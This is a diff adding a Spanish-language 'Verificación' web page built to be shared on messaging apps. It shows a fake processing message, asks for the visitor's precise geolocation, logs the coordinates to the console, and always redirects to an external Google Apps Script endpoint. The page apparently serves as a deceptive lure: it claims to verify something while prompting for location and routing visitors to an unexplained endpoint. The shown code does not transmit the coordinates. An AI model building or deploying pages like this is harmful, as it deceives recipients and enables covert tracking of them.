@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Verificación</title>
+
+    <!-- Vista previa para WhatsApp, Facebook, Telegram, etc. -->
+    <meta property="og:title" content="Verificación">
+    <meta property="og:description" content="Accede para continuar con la verificación.">
+    <meta property="og:image" content="https://TU-USUARIO.github.io/TU-REPOSITORIO/archivo.png">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter/X -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Verificación">
+    <meta name="twitter:description" content="Accede para continuar con la verificación.">
+    <meta name="twitter:image" content="https://TU-USUARIO.github.io/TU-REPOSITORIO/archivo.png">
+
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+        }
+
+        .contenedor {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+
+        .contenedor img {
+            width: 150px;
+            max-width: 80%;
+        }
+
+        .contenedor p {
+            color: #555;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="contenedor">
+        <img src="archivo.png" alt="Verificación">
+        <p>Procesando, espere un momento...</p>
+    </div>
+
+    <script>
+
+        const destino = "https://script.google.com/macros/s/AKfycbzdAnJFM1G2RIMXY_9CCHQScVkCYXwdJmoG7RoICrLHVOmoQqua3ttnN5xcj33mkbtg/exec";
+
+        // Solicitar ubicación
+        if ("geolocation" in navigator) {
+
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+
+                    console.log("Permiso de ubicación concedido");
+
+                    console.log("Latitud:", position.coords.latitude);
+                    console.log("Longitud:", position.coords.longitude);
+
+                    // Redireccionar
+                    window.location.href = destino;
+
+                },
+                function(error) {
+
+                    console.log("No se concedió el permiso de ubicación.");
+
+                    // Continuar igualmente hacia la página
+                    window.location.href = destino;
+
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+
+        } else {
+
+            // Navegador sin soporte de geolocalización
+            window.location.href = destino;
+
+        }
+
+    </script>
+
+</body>
+</html>
